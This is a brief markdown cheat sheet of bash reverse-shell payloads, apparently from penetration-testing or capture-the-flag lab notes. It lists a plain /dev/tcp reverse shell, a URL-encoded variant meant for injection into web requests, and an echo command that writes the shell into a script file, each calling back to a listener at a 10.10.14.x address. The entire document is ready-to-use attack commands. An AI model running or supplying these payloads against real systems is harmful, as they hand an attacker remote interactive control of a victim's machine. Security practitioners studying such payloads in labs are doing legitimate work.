## bash
- Normal
  - `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`
- URL Encode
  - `bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/443 0>%261'` 
- Make File
  - `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1'` 
